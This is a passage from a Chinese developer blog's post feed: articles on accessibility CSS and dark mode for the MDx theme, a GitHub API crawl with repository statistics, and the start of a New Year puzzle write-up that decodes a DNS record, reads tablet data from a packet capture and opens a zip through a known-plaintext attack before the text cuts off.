URL*/\r\n    article a::after {\r\n        content: \"(\" attr(href) \")\";\r\n    }\r\n\r\n    /*强制白底黑字*/\r\n    html &gt; body {\r\n        background-color: white!important;\r\n    }\r\n    article p {\r\n        color: rgba(0,0,0,.8)!important;\r\n    }\r\n\r\n    /*对于纸张上的长文章，衬线字体拥有更好的可读性。以下字体列表来自 fonts.css*/\r\n    article {\r\n        font: 13pt Georgia, \"Nimbus Roman No9 L\", \"Songti SC\", \"Noto Serif CJK SC\", \"Source Han Serif SC\", \"Source Han Serif CN\", STSong, \"AR PL New Sung\", \"AR PL SungtiL GB\", NSimSun, SimSun, \"TW\\-Sung\", \"WenQuanYi Bitmap Song\", \"AR PL UMing CN\", \"AR PL UMing HK\", \"AR PL UMing TW\", \"AR PL UMing TW MBE\", PMingLiU, MingLiU, serif!important;\r\n    }\r\n\r\n    /*除部分元素外，禁止在元素内部分页*/\r\n    * {\r\n        page-break-inside: avoid;\r\n    }\r\n    article p, article a, #comments, article {\r\n        page-break-inside: auto;\r\n    }\r\n}</pre>\n<p>MDx 自 1.9.3 版本起已经包含了对文章页的打印样式优化。可以很容易地看出，优化后的样式在物理纸张上将更容易阅读。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg\" alt=\"\" width=\"1345\" height=\"1602\" class=\"aligncenter size-full wp-image-1959\"></a>\n<h2>prefers-color-scheme</h2>\n<p><code>prefers-color-scheme</code> 是最近才被浏览器广泛支持的一个媒体查询，但它的功能却很强大：<strong>响应系统级黑暗模式。</strong>这样，我们可以在开启黑暗模式的系统中让网页具有更好的可读性。不过由于这个媒体查询直到最近才被广泛支持，因此大部分网站对此并没有进行适配。</p>\n<blockquote><p>一些适配这一特性的网站：少数派、微信公众平台（文章页）等。</p></blockquote>\n<p>通过像这样的媒体查询，我们可以在系统启用黑暗模式时让页面实时响应：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    body {\r\n        background-color: #212121;\r\n        color: rgba(255, 255, 255, .7);\r\n    }\r\n}</pre>\n<p><code>prefers-color-scheme</code> 一共有 3 个可能值：<code>no-preference</code>, <code>light</code> 和 <code>dark</code>。你也可以不像上面的例子那样默认使用亮色样式并在黑暗模式下启用黑暗样式，而可以反过来将黑暗样式作为默认，用亮色样式覆盖。在不支持的浏览器上将会显示默认样式（即媒体查询不会生效）。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<h2>prefers-reduced-motion</h2>\n<p>看名字就猜得出，<code>prefers-reduced-motion</code> 是和 <code>prefers-color-scheme</code> 师出同门的媒体查询。因此，和 <code>prefers-color-scheme</code> 一样，它也是在最近才获得了浏览器的广泛支持。它的作用也很强大：<strong>响应系统的“减弱动态效果”模式。</strong>这对某些不喜欢甚至无法接受动画的用户可能很有帮助。要知道，对有些用户来说这甚至是医疗上的必要。使用如下的媒体查询，我们可以在系统启用减弱动态效果模式时让页面实时响应，减弱动画：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-reduced-motion: reduce) {\r\n    /*只是一个示例，实际情况中可以保留一些淡入淡出效果*/\r\n    * {\r\n        transition: all 0s!important;\r\n        transform: none!important;\r\n    }\r\n}</pre>\n<p><code>prefers-reduced-motion</code> 只有 2 个可能值：<code>no-preference</code> 和 <code>reduce</code>，在不支持的浏览器上该媒体查询不会生效。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg\" alt=\"\" width=\"792\" height=\"515\" class=\"aligncenter size-full wp-image-1962\"></a>\n<h1>黑暗模式适配</h1>\n<p>黑暗模式可不是简单地切换到黑底白字这么简单。<strong>单纯地使用黑底白字会导致页面元素之间对比度过高，文字刺眼，反而降低了页面的可访问性。</strong>我在下面总结了几条应用在了 MDx 中的黑暗模式优化规则和 Google 推荐的优化规则：</p>\n<p><strong>一是避免黑底白字。</strong>黑底白字看起来真的很难受，事实上，深灰和浅灰是黑暗模式最好的配色。比较下方例子里的两段文本，毫无疑问深灰色背景和浅灰色文字搭配的样式的可读性要比黑底白字高很多。（p.s. 有时候这条规则在白底黑字时也适用）</p>\n<p><strong>二是更改部分元素的亮度和对比度以增强可读性。</strong>你可能已经注意到了，下面优化的例子里标题文字的颜色改变了。很明显，未优化的黑暗模式中标题可读性不如优化的版本。在实际中，我们通常可以通过 CSS 滤镜来实现这一更改。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    h1 {\r\n        /*反相颜色后再将色相旋转 180 度，使亮度反相*/\r\n        filter: invert(1) hue-rotate(180deg);\r\n    }\r\n}</pre>\n<p><strong>三是避免让图片过亮。</strong>未经处理的图片通常会导致过高的对比度，降低可读性。在 MDx 中，我选择降低图片的亮度来避免图片刺眼，而 Google 的建议则是使图片灰度，不过这会影响图片的整体观感。无论是哪一种方案，都可以使用 CSS 滤镜来轻松实现。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    img { \r\n        /*MDx 方案*/\r\n        filter: brightness(.8);\r\n        /*Google 方案*/\r\n        filter: grayscale(.5);\r\n    }\r\n}</pre>\n<div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是未优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg\"></p>\n</div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是经过优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg\"></p>\n</div>\n</div>\n<h1>其他细节</h1>\n<p>还有一些细节，虽然简单，但不可或缺。我把一部分没有在上文提到的 MDx 中的细节列在了这里。</p>\n<p><strong>一是允许页面缩放。</strong>在开发响应式页面时，很多网站会在页面头部添加这样一个 <code>meta</code>：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\"&gt;</pre>\n<p>这样的 <code>meta</code> 设定了页面的宽度，却也固定了页面的缩放比例，用户难以手动放大网页。<strong>这样的设置对一部分视力障碍用户非常不友好</strong>，以至于苹果决定在自家的浏览器上忽略禁止缩放的 <code>meta</code>。按照 Google 的推荐，如果你在 MDx 设置中启用了“允许页面缩放”，那么 MDx 会输出这样的 <code>meta</code> 标签，允许页面进行五倍以内的缩放：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=5\"&gt;</pre>\n<p><strong>尽管很多时候放大页面会导致页面结构被破坏，但这大大增强了页面的可访问性，利大于弊。</strong>因此，在 MDx 中，“允许页面缩放”是默认启用的。</p>\n<p><strong>二是在跨设备阅读时同步阅读记录。</strong>这属于 MDx 的“元老级”功能之一。注意到页面右上角的那个“在其他设备上继续阅读”的按钮了吗？如果你滚动页面后重新点击它，你会发现二维码发生变化了。通过在二维码中记录阅读进度，用户在扫描二维码切换设备阅读时，MDx 在新设备上会自动滚动到和原设备上一致的位置——好吧，目前基于百分比的算法在某些情况下可能不太准，但我已经设计了一个更复杂但更精确的阅读进度记录算法，之后就会更新到 MDx 中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg\" alt=\"\" width=\"1000\" height=\"574\" class=\"aligncenter size-full wp-image-1976\"></a>\n<p><strong>三是避免 Web 字体阻塞渲染。</strong>如果你在页面中使用了 Web 字体，在字体加载完成之前，浏览器可能不会渲染任何文本，这就导致用户可能需要等待一段时间才能开始浏览网页。Google 推荐使用 <code>font-display: swap;</code> 来向浏览器指定网页的 Web 字体渲染策略。这一规则会提供一个比较短的等待周期，如果在这段时间内 Web 字体没有完成加载，那么浏览器会以 fallback 字体渲染文本。任意时刻一旦 Web 字体完成渲染，浏览器就会使用 Web 字体重新渲染文本。这在大多数情况下都能满足可访问性的需求。</p>\n<p><strong>四是确保 html 元素具有合适的 <code>lang</code> 属性。</strong>这一属性声明了页面的主要语言，浏览器可以据此调整渲染策略，或者触发自动翻译；屏幕阅读器也能更好地阅读网页。</p>\n<p><strong>五是确保页面主要内容在丢失/禁用了 Javascript 甚至 CSS 的情况下仍然可用。</strong>作为一个以内容为主的网站，MDx 在禁用了 Javascript 的情况下页面主要内容仍然可用。这不只是为了 SEO，更是为了保证页面的可访问性。的确，目前的情况下，如果开启了 Lazyload，MDx 在禁用 Javascript 的情况下图片的确无法显示，但我会在后续版本中尽可能的优化这一问题。</p>\n<h1>附录：媒体查询开发技巧</h1>\n<p>有的时候，光有 CSS 响应媒体查询还不够，我们可能需要在 Javascript 中实时响应媒体查询。用如下代码就可以很简单地响应媒体查询：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">let mql = window.matchMedia(\"(prefers-reduced-motion: reduce)\");\r\nmql.addListener(handleMediaChange);\r\n\r\n//在添加监听后先调用一次，获得当前查询结果\r\nhandleMediaChange(mql);\r\n\r\nfunction handleMediaChange(mql){\r\n    if(mql.matches){\r\n        //查询匹配\r\n    }else{\r\n        //查询不匹配\r\n    }\r\n}</pre>\n<p>在开发上述媒体查询的过程中，我们需要频繁地切换系统的相应模式或者调出打印窗口。<strong>实际上，Chrome 提供了更简单的调试方法：</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1946\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg\" alt=\"\" width=\"723\" height=\"681\"></a>\n<p>只要在这里更改模式，相关媒体查询就能实时生效。这不会影响其他标签页，在关闭开发者工具之后也会自动恢复系统设置。</p>\n","link":"https://flyhigher.top/develop/1912.html"},{"title":"MDx Blog 现已随 MDx 1.9.5 发布","date":"2020-01-22 17:54:11","description":"<p>随着 MDx 发布 1.9.5 更新，<a href=\"https://mdxblog.flyhigher.top/\" rel=\"noopener noreferrer\" target=\"_blank\">MDx Blog</a> 现已建立。我将会在 MDx Blog 中分享一些开发故事并发布 MDx 更新日志。</p>","link":"https://flyhigher.top/diary/1905.html"},{"title":"GitHub 2019 统计无垠版","date":"2020-01-12 13:02:00","description":"\n<h1>缘起</h1>\n<p>2019 年底，我突发奇想想要自己统计一番 GitHub 上存储库的一些信息。尽管 GitHub 有自己的<a href=\"https://octoverse.github.com/\" target=\"_blank\" rel=\"noopener noreferrer\">年度统计</a>，我还是想试着自己爬取一下，说不定能挖出什么有意思的信息，何况这是我第一次有机会处理比较大量的数据，也算是一种学习的过程吧。于是花了一下午写了个简单的爬虫（时间都花在增加 Rate Limit 上了…），然后扔在了两台服务器上开始跑（GitHub  API 真是好文明）。</p>\n<p>从 2019.11.21 3 时到 2020.1.12 24 时的 52 天 21 小时内，我的爬虫一共爬取了<strong>与 2,024,705 个用户有关<sup>*</sup>的 14,651,923 个公共存储库的基础信息</strong>，平均每秒爬取 3.2 个存储库。据 GitHub 的官方数据计算，我爬取了大约 15% 的存储库信息，但由于封禁库和私有库的数量未知，我暂时无法确定我爬取的存储库占公共库的比例。同时由于存储库数量较多，基本可以认为爬取到的样本在时间尺度上已经足够随机，可以通过统计得出一般结论。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg\" alt=\"\" width=\"700\" height=\"606\" class=\"aligncenter size-full wp-image-1892\"></a>\n<p>爬到自己了，合影.jpg</p>\n<p>那么下面就来看看统计出来的一些结果吧。爬虫的技术细节和数据集下载放在文末。</p>\n<p>* 指这些用户拥有至少一个库</p>\n<h1>统计信息</h1>\n<p><strong>以下统计结果均基于已放于文末的数据集。</strong>由于爬虫爬取的时间跨度长，加上我并没有完整爬取 GitHub 所有存储库，因此我<strong>不能保证以下统计结果符合真实情况</strong>，各位可以下载数据集或自行爬取进行验证。</p>\n<h2>一些数据</h2>\n<div>\n<div>\n<div>\n<span>3,120,930</span><br>总爬取用户数</div>\n<div>\n<span>44.7%</span><br>的存储库创建<br>自 Fork</div>\n<div>\n<span>6.59%</span><br>的账户被删除或<br>封禁<sup>1</sup>\n</div>\n<div>\n<span>23,913</span><br>单用户拥有最大<br>库数量<sup>2</sup>\n</div>\n</div>\n</div>\n<p><sup>1</sup> 基于用户 ID 规律合理推断<br><sup>2</sup> 统计范围仅限于当前数据集</p>\n<p>比较出乎我意料的是创建自 Fork 的存储库的占比。我预估这样的存储库占比不会太低，但没有想到能接近一半。此外单用户拥有最大库数量也大大超出了我的预期，<a href=\"https://github.com/pombredanne\" rel=\"noopener noreferrer\" target=\"_blank\">pombredanne</a> 这个用户名下拥有将近 24k 的存储库，不过绝大多数都是 Fork 来的，在情理之中。此外<strong>这个数据集中</strong>拥有最多存储库的账户其实是一个组织 <a href=\"https://github.com/gitpan\" rel=\"noopener noreferrer\" target=\"_blank\">gitpan</a>，这个组织拥有 36,377 个存储库。</p>\n<h2>语言</h2>\n<p><canvas></canvas><br>\n首先必须要说明的是，在这个榜单中我<strong>排除了 HTML 和 CSS</strong>，因为在严格意义上它们不属于“编程语言”。如果把它们计算进来的话，分别有 640,368 个和 361,425 个存储库的主要语言分别是 HTML 和 CSS，这样在这份榜单中它们可以排到第 6 和 第 10 名。JavaScript 毫无疑问获得第一，第二名 Python 的热度则和 JavaScript 相差将近一半。<strong>此外还有 2,448,486 个存储库未能识别出语言，占比 16.7%。</strong>在上面的榜单之外，与机器学习和数据科学相关的语言还有 Jupyter Notebook 排名第 13，R 排名 20，Julia 排名 43。</p>\n<p>说实话这份排名和 GitHub 官方的排名<strong>差别很大</strong>，除了前三名，后面的基本都不太一样。我的排名统计结果完全基于 GitHub 对于存储库的主要语言识别，加上我的存储库数据不完整，和官方的数据不同是很正常的，可以做一个参考，但大概率还是官方排名更加准确。</p>\n<h2>许可证</h2>\n<p><canvas></canvas></p>\n<p>自 GitHub 推出许可证功能以来，拥有许可证的存储库比例升升降降，却始终没有超过一半。<strong>选择一个合适的许可证对项目的良好发展真的很有帮助</strong>，要了解如何选择合适的许可证，请参阅<a href=\"https://www.runoob.com/w3cnote/open-source-license.html\" rel=\"noopener noreferrer\" target=\"_blank\">这篇文章</a>。</p>\n<p><canvas></canvas></p>\n<p>对于拥有许可证的存储库，MIT<del> 麻省理工许可证 </del>总是占比最大的；第二则是 Apache-2.0 许可证。此外，WTFPL 许可证也挤入了前 15 名。</p>\n<h2>星标</h2>\n<p><canvas></canvas><br>\nStar 数量毫无疑问是一个存储库受欢迎程度的体现，而 Star 数高的项目基本上大家都了解过。<strong>截至爬取结束时间</strong>，GitHub 中 Star 数最多的库是 <a href=\"https://github.com/freeCodeCamp/freeCodeCamp\" rel=\"noopener noreferrer\" target=\"_blank\">freeCodeCamp</a> <del>非常完美的驼峰命名法</del>，其次则是著名项目 <a href=\"https://github.com/996icu/996.ICU\" rel=\"noopener noreferrer\" target=\"_blank\">996.ICU</a>。<a href=\"https://github.com/vuejs/vue\" rel=\"noopener noreferrer\" target=\"_blank\">Vue</a> 现在的 Star 数已经稳压 <a href=\"https://github.com/facebook/react\" rel=\"noopener noreferrer\" target=\"_blank\">React</a> 一头，Vue YES! 此外 <a href=\"https://github.com/sindresorhus/awesome\" rel=\"noopener noreferrer\" target=\"_blank\">awesome</a> 也挤进第七名。<br><canvas></canvas><br>\n由于 Star 需要时间积累，新项目的 Star 数量很可能是比不过老项目的，这就会导致有实力的新项目无法出现在榜单中。因此我还统计了日均 Star 数，试图通过日均 Star 数来反映项目受欢迎的程度。<strong>由于正热门的项目会比老牌热门项目有优势，这一项的统计范围是 2020-01-01 之前的所有存储库。</strong>996.ICU 和 freeCodeCamp 再次出现在前 10 名，而最近的热门项目 <a href=\"https://github.com/wenyan-lang/wenyan\" rel=\"noopener noreferrer\" target=\"_blank\">wenyan</a> 则飙升至第 2 名。此外还有 <a href=\"https://github.com/menzi11/BullshitGenerator\" rel=\"noopener noreferrer\" target=\"_blank\">BullshitGenerator</a>，即最近热门的“狗屁不通文章生成器”和 <a href=\"https://github.com/evil-huawei/evil-huawei\" rel=\"noopener noreferrer\" target=\"_blank\">evil-huawei</a> 分列第 3 和第 5 名。<br><canvas></canvas><br>\n说实话这个曲线<strong>比我预估的陡多了。</strong>你可能已经注意到了，这个图表的横轴不是均匀缩放的，实际上曲线要比看起来陡很多。同时受爬取方式的影响，GitHub 中 Star 数较少的存储库数量远比我爬取到的多。也就是说，<strong>实际情况下曲线远比这个图表上的陡。</strong>拿点 Star 不容易啊。</p>\n<h2>名称</h2>\n<p><canvas></canvas><br>\n终于知道了原来存储库的名称是有长度限制的…尽管最长有 100 位，<strong>大部分人还是喜欢 8 位长的存储库名。</strong>此外 1 位长的名称也比我预估的要多一些。举几个存储库名称长度为 100 的例子吧。</p>\n<ul>\n<li>testing-something-elsetesting-something-elsetesting-something-elsetesting-something-elsetesting-some</li>\n<li>acts_as_validated_config_so_app_will_not_run_in_random_situation_and_qa_gays_will_not_cry_to_you_whe</li>\n<li>……………………………………..________-………………………………-.—……</li>\n<li>—————————————————————————————————-</li>\n<li>nyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyan</li>\n</ul>\n<p>…创造力有够丰富的。</p>\n<p><canvas></canvas></p>\n<p>最近 GitHub 上有一种奇怪的风气，那就是建立 Awesome 合集<del>骗 Star</del>。看起来 Awesome 存储库满地都是，甚至还出现了关于 Awesome 的 Awesome 合集这种迷惑行为。于是我统计了一下，<del>还好，</del>占比<del>才</del> 0.5% 不到<del>，Awesomer 们任重而道远呐</del>。</p>\n<p><canvas></canvas></p>\n<p>尽管要在 github.io 上托管网站，存储库不一定要以 .github.io 结尾，但我还是统计了一下。拥有这类存储库的用户比我预想的要少一些，看来还有很多人没有完全发挥 GitHub 的完整实力啊<del>（比如我 Doge）</del>。同时<strong>这类存储库在所有存储库中占比 1.12%</strong>，看起来不多<del>，不过至少比 Awesome 多</del>。<br><canvas></canvas><br>\n看得出来 GitHub 对于用户名长度的限制是 1-40 位。用户名最短的 27 位占据了 <code>A-Z</code> 外加 <code>-</code> 的所有可能，而用户名最长的则是一个组织 <a href=\"https://github.com/UOIT-RESEARCH-database-information-group\" rel=\"noopener noreferrer\" target=\"_blank\">UOIT-RESEARCH-database-information-group</a>。不知道是巧合还是某种规律，<strong>最受欢迎的用户名长度和存储库名称长度一样，都是 8</strong>，有点意思。</p>\n<h2>创建时间</h2>\n<p><canvas></canvas><br>\n由于我并没有完整爬取所有存储库，我只能以相对值来统计每月新增存储库数量的变化趋势。<strong>在这个图表中，我将 2017-09 的数据设为了 100%。</strong>你一定一眼就能注意到 2017 年 6,7,8 月的“一柱擎天”。<del datetime=\"2020-02-05T09:18:30+00:00\">我第一次看到这个数据的时候的确愣了一下，不过就着这条新闻看就能明白为什么了：<strong>2017 年 6 月微软收购 GitHub。</strong></del></p>\n<blockquote><p>重新确认了一下，微软收购 GitHub 比这个高峰晚了一年，目前我对这个高峰没有什么很好的解释，如果你有什么思路的话欢迎评论。</p></blockquote>\n<p><strong>需要注意的是这张图表中我排除了 Fork 存储库</strong>，因为 Fork 存储库在 API 中的创建时间是原始存储库的时间，会影响整体趋势。此外，GitHub 中还有一个创建于 2007 年 10 月 29 日的存储库，那就是 <code>id: 1</code> 的…</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"mojombo\" data-mdxgithubp=\"grit\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/mojombo/grit\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>而它的创建者正是 GitHub 的创始人之一 Tom Preston-Werner。</p>\n<h1>一些有趣的结果</h1>\n<p>当初打算自己爬的目的之一就是想看看能不能挖出什么有意思的信息，结果真的有一些不挖不知道的信息。</p>\n<h2>奇怪的存储库</h2>\n<p>在爬取到的所有存储库中，<strong>有 3 个存储库是“无主”的</strong>，即它们的 owner 属性为空。这三个存储库的基本信息如下。</p>\n<div class=\"mdui-table-fluid mdui-table-hoverable\"><table class=\"mdui-table\">\n<thead><tr>\n<th>ID</th>\n<th>名称</th>\n<th>Forked</th>\n<th>Star</th>\n<th>语言</th>\n<th>许可证</th>\n<th>创建于</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>72385291</td>\n<td>vscode-redprl</td>\n<td>否</td>\n<td>10</td>\n<td>TypeScript</td>\n<td>apache-2.0</td>\n<td>2016-10-31 08:50:01</td>\n</tr>\n<tr>\n<td>181218346</td>\n<td>electron-sys</td>\n<td>否</td>\n<td>10</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-14 03:20:56</td>\n</tr>\n<tr>\n<td>181391880</td>\n<td>node-sys</td>\n<td>否</td>\n<td>6</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-15 09:33:08</td>\n</tr>\n</tbody>\n</table></div>\n<p><strong>更奇怪的是这三个存储库“无主”的情况还不一样。</strong>第一个存储库可以通过 <code>/repositories</code> 这个 GitHub API 找到， <a href=\"https://api.github.com/repositories?since=72385290\" target=\"_blank\" rel=\"noopener noreferrer\">这个链接</a>中的第一个存储库就是它；而其余两个存储库甚至无法在 <code>/repositories</code> API 中找到。不过就算能在 API 中找到第一个存储库，它的 <code>html_url</code>，即 <code>https://github.com//vscode-redprl</code> 仍然是不可访问的。这可能是 GitHub 早期的一个 Bug 导致的，不过我仍然对爬虫是如何找到这三个存储库的以及这些 Stars 是哪里来的感到好奇。</p>\n<h2>奇怪的用户名</h2>\n<p>在爬虫爬了一段时间以后，API 中突然开始出现大量的以 fdp 开头的 18 位乱码作为用户名的用户。这些用户拥有的存储库和 starred 的存储库都为 0，而他们的 <code>html_url</code> 为 404。以下是几个例子。</p>\n<ul>\n<li>fdpEpolGCEdQX4ZlRJ</li>\n<li>fdp8XaVrdtmDZnO5pR</li>\n<li>fdp8XRAGnwAOkTr2Ya</li>\n</ul>\n<p>由于我的爬虫并没有超过 Rate Limit，所以我排除了这是污染数据的可能。我怀疑这可能是某种 Bot 账户，于是一边更新爬虫过滤掉了这些用户，一边给 GitHub 支持发邮件问了具体情况。过了两天 GitHub 回复我说这些是<strong>被自动判为可疑进而被封禁的用户</strong>（原话是 they have been flagged by our automated measures for detecting suspicious behavior）。<del>想到我正在疯狂爬取 GitHub，突然害怕.webp</del></p>\n<p>行吧。</p>\n<h1>技术细节</h1>\n<p>爬虫使用 Python3 编写，数据库使用 MySQL。爬虫共使用了 4 个 API Token，在两台服务器上分布式爬取。爬取思路为：</p>\n<ol>\n<li>通过 <code>/users</code> API 遍历用户，每个请求最多获取 30 个用户信息</li>\n<li>循环 30 个用户，分别获取 <code>/users/&lt;user_name&gt;/starred</code> 和 <code>/users/&lt;user_name&gt;/repos</code> API 中的存储库信息，每个请求最多获取 100 个存储库信息，超过 100 个的分页获取</li>\n<li>提取存储库信息，插入数据库。对于已存在的存储库，更新数据</li>\n<li>获取下 30 个用户信息</li>\n</ol>\n<p>由于爬取过程中我多次调整了爬虫逻辑，爬虫爬取到的用户 ID 区间并非连续的，具体区间为1-839586, 14800001-14885493 及 28965251-31161101。</p>\n<h1>免责声明</h1>\n<p>本站会尽可能地提供准确信息，但本站不对此文章中信息的准确性和即时性及带来的任何影响负责。</p>\n<p>本站不代表 GitHub 官方，本文仅供学习之用，请不要将本文内容直接用于任何商业项目中。</p>\n<h1>数据集下载</h1>\n<p>导出的 SQL 文件大约为 1.38GB，全部放在了 GitHub 上（在危险的边缘试探.webp</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"github-analysis-2019\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/github-analysis-2019\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>此外我也提供了 MEGA 下载，链接<a href=\"https://mega.nz/#F!juxm3A6T!7Vwpzi82W1OFrqTLu1A1pQ\">在这里</a>。</p>\n","link":"https://flyhigher.top/develop/1564.html"},{"title":"Milkice 跨年红包解谜 Writeup 及无垠跨年红包解谜答案","date":"2020-01-02 04:29:19","description":"\n<blockquote><p><del>又到了水文章的时间呢</del></p></blockquote>\n<p>先说明一下，这篇文章原本不是在计划中的，而原来说好的「在路上的两篇」文章<del>绝对不会咕</del>。我自己的红包答案本来打算直接塞在年度总结里的，结果发现稍微有些长，再加上我还花了一些时间解了<a href=\"https://milkice.me/\">奶冰</a>的红包解谜游戏，就打算把两个解谜过程放在一起单独写一篇文章。<del>真是个水文章的好理由</del>（被打死</p>\n<h1>奶<del> 子 </del>冰的红包</h1>\n<p>奶冰的红包题目比我的难多了，所以让我们先从难的开始吧。首先看一下<a href=\"https://milkice.me/2019/12/31/2019-summary/\">题目</a>：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1524\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg\" alt=\"\" width=\"746\" height=\"410\"></a>\n<p>入口是 <code>happy.2020.milkice.me</code>，扔到浏览器里面表示找不到 IP，那么大概率就是 DNS 的 TXT 记录了，查一下得到 <code>nb2hi4dthixs63ljnrvwsy3ffzwwkl3tivrvezluomxxg5dsmvqw2ltqmnqxa3th</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1525\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg\" alt=\"\" width=\"896\" height=\"278\"></a>\n<p>第一眼没看出来是什么编码，直觉是 BaseXX 系列的编码，加上提示“不只有 Base64”，可以推断出是 Base32，转大写解码得到 <code>https://milkice.me/sEcRets/stream.pcapng</code>。是个 URL，下载得到一个 Wireshark 文件，打开一看是和某 USB 设备的通讯抓包。<del>不会做，不做了。</del></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1526\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg\" alt=\"\" width=\"1500\" height=\"813\"></a>\n<p>奶冰提示我“Google 上搜得到”，结合第二条提示搜索“wacom pcapng”找到了<a href=\"https://blogs.tunelko.com/2017/02/05/bitsctf-tom-and-jerry-50-points/\">这篇文章</a>（<del>这™就是答案啊</del>）。看起来是一样的套路，即通过解析数据得到数位板上画的内容，于是按文章的思路筛选出数位板发给主机的数据，导出，然后再用 tshark 导出文本数据。本来我想直接用文章中的 POC 的，结果折腾半天因为源的蜜汁原因库没装上，于是按文章中给出的数据结构自己写了段代码，分别导出 X、Y 轴数据扔进 Excel 画散点图。（<del>别问我为什么用 Excel，因为我手边没有更好的工具了</del>）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1528\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg\" alt=\"\" width=\"1280\" height=\"530\"></a>\n<p><span>翻车现场之一</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1539\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg\" alt=\"\" width=\"1000\" height=\"286\"></a>\n<p><span>懵逼奶冰.webp</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1533\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg\" alt=\"\" width=\"1500\" height=\"462\"></a>\n<p>看得出有手写文字，不过是上下颠倒的，翻转图片得 <code>https://milkice.me/2020/uso.zip</code>。是个 zip，下载打开一看，有密码。<del>不会解，不做了。</del> 第一反应是暴力解密码，但是暴力跑了 15 分钟还是没有跑出来。暴力太不优雅了，肯定不是正确思路，但奶冰什么都不肯说了。不过在这时我终于发现第一个红包口令码就藏在压缩包的注释中，Get。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1544\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg\" alt=\"\" width=\"806\" height=\"593\"></a>\n<p>然而题还没解完，回去看提示，看到提供了 osu 谱面下载，于是打算不管怎么样先下载来看看。然而 osu 谱面下载要登录，只好又花了几分钟找到第三方站点，成功下载。这时候可以注意到 uso.zip 里有个同名文件（432314 Mike Greene – Bill Nye the Science Guy Theme Song (Chinese Intro).osz），可以联想到是明文攻击。好吧，上 ARCHPR，十秒解出。</p>\n<a 